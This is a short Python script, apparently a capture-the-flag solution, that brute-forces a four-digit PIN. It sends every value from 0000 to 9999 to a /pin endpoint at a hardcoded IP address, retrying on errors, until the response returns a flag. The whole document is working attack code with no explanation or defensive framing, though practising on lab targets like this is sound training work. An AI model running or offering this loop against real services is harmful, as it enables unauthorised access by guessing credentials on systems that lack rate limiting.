
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from time import sleep

IP = "154.57.164.79"
PORT = 34002

URL = f"http://{IP}:{PORT}/pin"

TIMEOUT = (3, 5)  # Connection timeout, read timeout
MAX_RETRIES = 3

session = requests.Session()

# Retry transient connection/server errors
retry = Retry(
    total=MAX_RETRIES,
    connect=MAX_RETRIES,
    read=MAX_RETRIES,
    status=MAX_RETRIES,
    backoff_factor=0.5,
    status_forcelist=[429, 500, 502, 503, 504],
    allowed_methods=["GET"],
    respect_retry_after_header=True,
)

adapter = HTTPAdapter(max_retries=retry)
session.mount("http://", adapter)

try:
    for pin in range(10000):
        formatted_pin = f"{pin:04d}"

        try:
            response = session.get(
                URL,
                params={"pin": formatted_pin},
                timeout=TIMEOUT
            )

            if response.status_code == 200:
                try:
                    data = response.json()
                except requests.exceptions.JSONDecodeError:
                    data = {}

                if "flag" in data:
                    print(f"\n[+] Correct PIN: {formatted_pin}")
                    print(f"[+] Flag: {data['flag']}")
                    break

            print(f"[*] Attempted: {formatted_pin}", flush=True)

        except requests.exceptions.RequestException as e:
            print(f"[!] Error on PIN {formatted_pin}: {e}")

            # Brief cooldown after a failed request
            sleep(1)

    else:
        print("\n[-] No valid PIN found.")

except KeyboardInterrupt:
    print("\n[!] Interrupted by user.")

finally:
    session.close()
